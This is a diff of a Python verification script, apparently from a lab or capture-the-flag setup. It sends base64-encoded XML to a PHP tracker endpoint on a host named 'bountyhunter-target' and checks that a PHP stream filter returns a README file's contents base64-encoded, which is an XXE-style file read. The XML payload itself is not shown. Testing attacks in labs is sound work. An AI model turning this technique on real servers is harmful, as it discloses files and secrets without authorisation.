@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 """Verify native PHP stream filtering on a public, non-sensitive fixture file."""
 import base64
+import re
 import urllib.parse
 import urllib.request
 
@@ -14,7 +15,10 @@ xml = (
 data = urllib.parse.urlencode({"data": base64.b64encode(xml.encode()).decode()}).encode()
 with urllib.request.urlopen("http://bountyhunter-target/tracker_diRbPr00f314.php", data=data, timeout=10) as res:
     body = res.read().decode("utf-8", "replace")
-assert base64.b64encode(b"Tasks:\n").decode().rstrip("=") in body, (
-    "Expected the actual PHP stream filter to encode a harmless existing text fixture"
+match = re.search(r"Reward:\s*([A-Za-z0-9+/=]+)", body)
+assert match, "No Base64 field returned by the real PHP stream filter"
+decoded = base64.b64decode(match.group(1), validate=True)
+assert decoded.startswith(b"Tasks:\n") and b"Disable 'test' account" in decoded, (
+    "Decoded PHP stream output did not match the non-secret README fixture"
 )
 print("PASS: native PHP stream filter returns base64 of a benign text file", flush=True)
